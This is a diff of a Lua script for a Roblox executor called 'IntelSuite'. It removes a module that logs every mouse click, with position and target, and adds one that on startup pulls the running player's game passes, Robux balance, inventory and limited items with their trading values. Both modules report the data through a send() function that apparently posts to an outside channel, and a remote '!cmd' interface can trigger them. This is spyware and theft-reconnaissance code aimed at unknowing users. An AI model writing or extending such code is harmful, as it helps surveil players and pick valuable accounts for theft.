@@ -442,52 +442,87 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 11: Mouse Logger
--- Logs mouse clicks + screen position every 30s
--- Also logs every left/right click instantly
+-- MODULE 12: Game Pass / Inventory Checker
+-- Hits Roblox API to check owned game passes + inventory value
+-- Runs on startup + available via !cmd inventory
 -- ============================================================
-local function startMouseLogger()
-    if getgenv().IntelSuite.MouseLogActive then
-        send("MOUSE LOG", "Already active.", 16776960)
-        return
-    end
-    getgenv().IntelSuite.MouseLogActive = true
+local function runInventoryCheck()
+    if not getgenv().IntelSuite.IsActive then return end
+    task.spawn(function()
+        local uid = tostring(LocalPlayer.UserId)
+        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid
 
-    local mouse = LocalPlayer:GetMouse()
-
-    -- Log every left click
-    mouse.Button1Down:Connect(function()
-        if not getgenv().IntelSuite.IsActive then return end
+        -- Game passes for current game
         pcall(function()
-            local target = mouse.Target and tostring(mouse.Target:GetFullName()) or "nil"
-            send("MOUSE CLICK",
-                "**User:** " .. LocalPlayer.Name ..
-                "\n**Button:** Left Click" ..
-                "\n**Position:** " .. tostring(mouse.X) .. ", " .. tostring(mouse.Y) ..
-                "\n**Target:** " .. target,
-                8388736
-            )
+            local placeId = tostring(game.PlaceId)
+            local r = game:HttpGet("https://inventory.roblox.com/v1/users/" .. uid .. "/items/GamePass?limit=25")
+            local data = HttpService:JSONDecode(r)
+            if data and data.data then
+                local passes = {}
+                for _, v in ipairs(data.data) do
+                    table.insert(passes, "- " .. tostring(v.name or "Unknown") .. " (ID: " .. tostring(v.assetId or "?") .. ")")
+                end
+                if #passes > 0 then
+                    result = result .. "\n\n**Game Passes Owned (" .. tostring(#passes) .. "):**\n" .. table.concat(passes, "\n")
+                else
+                    result = result .. "\n\n**Game Passes:** None found"
+                end
+            end
         end)
-    end)
 
-    -- Log every right click
-    mouse.Button2Down:Connect(function()
-        if not getgenv().IntelSuite.IsActive then return end
+        -- Robux balance (if accessible)
         pcall(function()
-            local target = mouse.Target and tostring(mouse.Target:GetFullName()) or "nil"
-            send("MOUSE CLICK",
-                "**User:** " .. LocalPlayer.Name ..
-                "\n**Button:** Right Click" ..
-                "\n**Position:** " .. tostring(mouse.X) .. ", " .. tostring(mouse.Y) ..
-                "\n**Target:** " .. target,
-                8388736
-            )
+            local r = game:HttpGet("https://economy.roblox.com/v1/users/" .. uid .. "/currency")
+            local data = HttpService:JSONDecode(r)
+            if data and data.robux then
+                result = result .. "\n**Robux Balance:** " .. tostring(data.robux)
+            end
         end)
-    end)
 
-    send("MOUSE LOG", "Now logging all mouse clicks.\n**User:** " .. LocalPlayer.Name, 65280)
+        -- Recent items from inventory
+        pcall(function()
+            local r = game:HttpGet("https://inventory.roblox.com/v2/users/" .. uid .. "/inventory?assetTypes=Hat,Gear,Face&limit=10&sortOrder=Desc")
+            local data = HttpService:JSONDecode(r)
+            if data and data.data then
+                local items = {}
+                for _, v in ipairs(data.data) do
+                    table.insert(items, "- " .. tostring(v.assetName or "Unknown"))
+                    if #items >= 10 then break end
+                end
+                if #items > 0 then
+                    result = result .. "\n\n**Recent Inventory (Hats/Gear/Faces):**\n" .. table.concat(items, "\n")
+                end
+            end
+        end)
+
+        -- RAP estimate via recent limiteds
+        pcall(function()
+            local r = game:HttpGet("https://inventory.roblox.com/v1/users/" .. uid .. "/assets/collectibles?limit=10&sortOrder=Desc")
+            local data = HttpService:JSONDecode(r)
+            if data and data.data then
+                local totalRAP = 0
+                local limiteds = {}
+                for _, v in ipairs(data.data) do
+                    local rap = v.recentAveragePrice or 0
+                    totalRAP = totalRAP + rap
+                    table.insert(limiteds, "- " .. tostring(v.name or "Unknown") .. " (RAP: " .. tostring(rap) .. ")")
+                    if #limiteds >= 10 then break end
+                end
+                if #limiteds > 0 then
+                    result = result .. "\n\n**Limiteds (first 10, est. RAP: " .. tostring(totalRAP) .. "R$):**\n" .. table.concat(limiteds, "\n")
+                else
+                    result = result .. "\n\n**Limiteds:** None"
+                end
+            end
+        end)
+
+        send("INVENTORY CHECK", result:sub(1, 1900), 16776960)
+    end)
 end
 
--- Store for !cmd mouselog
-getgenv().IntelSuite.MouseLogActive = false
-getgenv().IntelSuite.StartMouseLogger = startMouseLogger
+-- Run on startup
+task.wait(4)
+runInventoryCheck()
+
+-- Store for !cmd inventory
+getgenv().IntelSuite.InventoryCheck = runInventoryCheck
